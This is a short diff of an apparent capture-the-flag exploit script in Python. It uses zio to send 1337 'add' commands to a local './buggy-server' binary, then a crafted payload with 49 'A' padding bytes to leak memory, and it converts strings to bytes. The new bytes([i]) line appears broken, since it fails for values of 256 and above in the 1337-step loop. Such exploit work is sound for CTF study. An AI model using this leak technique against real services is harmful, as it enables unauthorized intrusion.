@@ -58,8 +58,8 @@ io = zio('./buggy-server')
 # io = zio((pwn.server, 1337))
 
 for i in range(1337):
-    io.writeline('add ' + str(i))
-    io.read_until('>>')
+    io.writeline(b'add ' + bytes([i]))
+    io.read_until(b'>>')
 
 io.write(b"add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + b"A" * 49 + b"\nshow\n")
 io.read_until(b'A' * 49)
